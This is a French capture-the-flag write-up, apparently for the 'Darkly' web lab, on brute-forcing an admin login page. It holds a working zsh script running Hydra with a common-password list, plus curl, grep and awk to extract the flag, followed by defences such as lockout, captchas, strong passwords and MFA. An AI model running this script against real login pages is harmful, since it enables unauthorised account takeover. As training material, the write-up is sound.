# Faille de brute force

## Qu'est-ce qu'une faille de brute force ?

Une faille de brute force se produit lorsqu'un attaquant tente systématiquement toutes les combinaisons possibles d'identifiants (ou mots de passe) pour accéder à un système sécurisé. Il s'agit d'une méthode très simple, mais potentiellement efficace, qui repose sur le fait de tester un grand nombre de mots de passe ou de clés jusqu'à ce que l'attaquant trouve la bonne combinaison. Cette méthode peut être particulièrement efficace si le mot de passe est simple, commun ou facilement devinable.

Les outils d'attaque par force brute automatisent ce processus, permettant à l'attaquant de tester des milliers, voire des millions, de combinaisons en très peu de temps.

## Comment j'ai exploité cette faille ?

J'ai utilisé un script pour réaliser une attaque par force brute sur un serveur web, en combinant l'outil **Hydra** pour automatiser la tentative de connexion, et l'outil **Curl** pour vérifier la réponse du serveur. Voici le script que j'ai utilisé :

```bash
#!/bin/zsh

echo "Script de brutforce\n\nDonne l'IP stp :"

read  IP_DARKLY

if [ -z $IP_DARKLY ]; then
    echo "Donne l'IP j'ai dit !"
    exit 1
fi

# Exécution de Hydra pour essayer différents mots de passe
hydra -l admin -P 10000-most-common-passwords.txt -F -V "$IP_DARKLY" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'

echo "\n\nDonne le mot de passe qu'on test ca :"

read PASSWORD

# Utilisation de curl pour vérifier si le mot de passe est correct et récupérer le flag
curl "http://$IP_DARKLY/index.php?page=signin&username=admin&password=$PASSWORD&Login=Login#" | grep flag | awk -F': | <' '{print "\nThe flag => "$2}'
```

### Explication du Script

1. **Hydra** : Utilisé pour essayer une liste de 10 000 mots de passe communs afin de casser le mot de passe de l'utilisateur "admin" sur la page de connexion du serveur.
2. **Curl** : Après avoir récupéré le mot de passe, j'ai utilisé `curl` pour envoyer une requête HTTP au serveur avec le mot de passe trouvé et rechercher un **flag** dans la réponse de la page.
3. **awk et grep** : Ces outils permettent d'extraire le flag trouvé sur la page si le mot de passe est correct.

## Solution pour contrer les attaques par force brute

### 1. **Randomiser le délai de réponse**

L'une des solutions les plus efficaces contre une attaque par force brute est d'ajouter un **délai de réponse** aléatoire. Actuellement, le serveur que j'attaque met un délai de 2 secondes si le mot de passe est incorrect. Un attaquant peut s'attendre à ce délai et ajuster son attaque en conséquence.

Pour contrer cela, on peut introduire une variabilité dans le délai de réponse (par exemple entre 1 et 5 secondes), rendant beaucoup plus difficile pour un attaquant d'estimer la durée exacte et donc de mener une attaque efficace. Cela introduit une incertitude dans le processus d'attaque, ralentissant potentiellement les tentatives de force brute.

### 2. **Bloquer ou limiter les tentatives de connexion**

- **Verrouillage temporaire** : Après un certain nombre de tentatives de connexion échouées, verrouiller temporairement le compte pour une durée spécifique (par exemple 15 minutes).
- **Captchas** : Demander à l'utilisateur de résoudre un captcha après un nombre défini de tentatives échouées peut également décourager les attaques automatisées.

### 3. **Utilisation de mots de passe forts**

Une bonne défense contre les attaques de force brute est d'encourager (ou d'imposer) l'utilisation de mots de passe longs et complexes. Cela augmente considérablement le temps nécessaire pour que l'attaquant devine le mot de passe, même en utilisant des outils automatisés.

### 4. **Utilisation de l'authentification multi-facteurs (MFA)**

L'authentification multi-facteurs est une méthode très efficace pour empêcher les attaques de force brute. Même si un attaquant parvient à casser le mot de passe, il lui faudra également un second facteur (comme un code envoyé par SMS ou une application d'authentification), ce qui rend l'attaque beaucoup plus difficile.
